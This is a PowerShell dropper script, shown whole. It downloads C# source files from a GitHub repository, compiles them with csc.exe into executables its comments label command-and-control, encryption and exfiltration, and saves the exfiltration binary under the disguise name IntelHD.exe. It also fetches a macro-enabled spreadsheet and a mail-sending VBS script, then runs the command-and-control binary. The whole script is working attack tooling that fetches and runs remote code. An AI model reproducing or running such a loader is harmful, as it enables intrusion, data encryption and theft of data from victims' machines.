$b=new-object net.webclient;
$b.proxy=[Net.WebRequest]::GetSystemWebProxy();$b.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;

#Part 1 - CC
$my_path="C:temp\cexec.cs"
$url='https://raw.githubusercontent.com/FurqanKhan1/D/master/cexec.cs';
$b.DownloadFile($url, $my_path) ;
$command = "cmd /C C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:C:\temp\cnc.exe C:\temp\cexec.cs"
invoke-expression $command
$command1="cmd /C C:\temp\cnc.exe"
#invoke-expression $command

#Part 2 - Encrypt
$my_path_c="C:\temp\encoding.cs"
$url_c='https://raw.githubusercontent.com/FurqanKhan1/D/master/encoding.cs';
$b.DownloadFile($url_c, $my_path_c) ;
$command = "cmd /C C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:C:\temp\flash.exe C:\temp\encoding.cs"
invoke-expression $command
$command2="cmd /C C:\temp\flash.exe"
#invoke-expression $command

#Part 3 - Exfil
$my_path_k="C:\temp\exfil.cs"
$url_k='https://raw.githubusercontent.com/FurqanKhan1/D/master/exfil.cs';
$b.DownloadFile($url_k, $my_path_k) ;
$command = "cmd /C C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -out:C:\temp\IntelHD.exe C:\temp\exfil.cs"
invoke-expression $command
$command3="cmd /C C:\temp\IntelHD.exe"
#invoke-expression $command

#Part 4 - Download 
$my_path_d="C:\temp\A.xlsm"
$url='https://raw.githubusercontent.com/FurqanKhan1/D/master/Automate.xlsm';
$b.DownloadFile($url, $my_path_d) ;

#Part 5 - Mail
$my_path_m="C:\temp\so.vbs"
$url='https://raw.githubusercontent.com/FurqanKhan1/D/master/so.vbs';
$b.DownloadFile($url, $my_path_m) ;
$command4 = "cmd /C cscript "+$my_path_m
#invoke-expression $command
$comm=$command1
invoke-expression $comm
